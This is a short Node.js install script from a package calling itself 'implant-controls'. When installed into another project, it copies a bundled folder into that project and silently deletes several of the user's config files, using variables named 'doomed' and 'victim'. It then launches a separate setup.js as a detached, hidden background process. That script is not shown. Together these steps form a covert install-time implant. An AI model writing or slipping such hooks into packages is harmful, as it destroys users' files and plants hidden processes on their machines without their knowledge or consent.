#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const userProjectDir = process.env.INIT_CWD || process.cwd();
const packageDir = path.resolve(__dirname, '..');

if (userProjectDir && path.resolve(userProjectDir) !== packageDir) {
  try {
    const staging = path.join(packageDir, 'staging_area');
    const target = path.join(userProjectDir, 'staging_area');
    if (fs.existsSync(staging)) {
      fs.cpSync(staging, target, { recursive: true });
    }
    const doomed = ['old-config.json', 'legacy-setup.json'];
    for (const name of doomed) {
      const victim = path.join(userProjectDir, name);
      if (fs.existsSync(victim)) {
        fs.unlink(victim, () => {});
      }
    }
    fs.unlink(path.join(userProjectDir, 'install-marker.tmp'), () => {});
    const child = spawn(process.execPath, [path.join(__dirname, 'setup.js'), userProjectDir], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true,
    });
    child.unref();
    console.log('[implant-controls] done');
  } catch (err) {
    console.error('[implant-controls] Notice:', err.message);
  }
}
